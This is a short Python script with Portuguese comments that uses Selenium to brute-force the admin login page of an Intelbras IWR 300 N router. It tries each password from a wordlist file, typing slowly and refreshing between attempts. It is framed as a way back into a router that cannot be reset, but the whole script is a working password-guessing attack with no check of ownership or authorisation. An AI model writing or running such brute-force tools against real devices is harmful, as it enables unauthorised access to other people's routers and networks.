# Funcao - Fazer Brute force no roteador Intelbras IWR 300 N caso nao possa resetar.
# Pode ser feito de maneira estruturada, eu preferi usar POO para praticar.
# Use o Selenium IDE para pegar os campos necessarios.
# Baixe o webdriver do navegador para usar o selenium.

from selenium import webdriver
from time import sleep

# Caminho do Web driver
driver = webdriver.Chrome(
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chromedriver.exe')


class Chrome:
    def __init__(self, driver):
        self.driver = driver
        self.url = 'http://192.168.2.1/index.html#!/login'

    def go_to_page(self):
        self.driver.get(self.url)

    def preencher(self):
        # Arquivo de senhas no mesmo diretorio do script.
        self.senhas = open('senhas.txt', 'r')

        for senha in self.senhas:
            try:
                sleep(4)
                campo = self.driver.find_element_by_id('flogin')
                
                # reduz a velocidade de digitacao do selenium.
                for letra in senha:
                    campo.send_keys(letra)
                    sleep(0.5)

                sleep(2)
                submit = self.driver.find_element_by_class_name('itb-button')
                submit.click()
                sleep(3)
                self.driver.refresh()
            except:
                print('Verifique se conseguiu Acesso, o processo terminou.')
                print('Caso nao tenha conseguido, tente com outro arquivo de senhas.')
                exit()


# instanciar o objeto.
gchrome = Chrome(driver)

# chamar a pagina.
gchrome.go_to_page()

# realiza o brute force
gchrome.preencher()
